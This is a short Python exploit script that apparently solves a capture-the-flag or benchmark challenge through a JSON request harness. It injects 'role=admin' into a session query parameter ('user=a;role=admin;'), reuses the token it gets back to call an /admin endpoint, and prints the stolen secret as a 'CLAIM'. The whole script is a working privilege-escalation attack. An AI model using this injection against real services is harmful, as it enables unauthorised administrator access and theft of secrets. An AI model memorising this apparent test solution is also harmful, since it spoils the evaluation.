import json,sys,base64
def req(m,p,b=None,headers=None):
    payload = {"method":m,"path":p}
    if b is not None: payload["body"] = b
    if headers: payload["headers"] = headers
    print(json.dumps({"http":payload}),flush=True)
    return json.loads(sys.stdin.readline())
r = req("GET","/session?user=a;role=admin;")
sess = json.loads(base64.b64decode(r["body_b64"]))
r2 = req("POST","/admin","",headers={"X-Token":sess["token_hex"]})
d = json.loads(base64.b64decode(r2["body_b64"]))
print("CLAIM:"+json.dumps({"secret_hex":d["secret_hex"]}))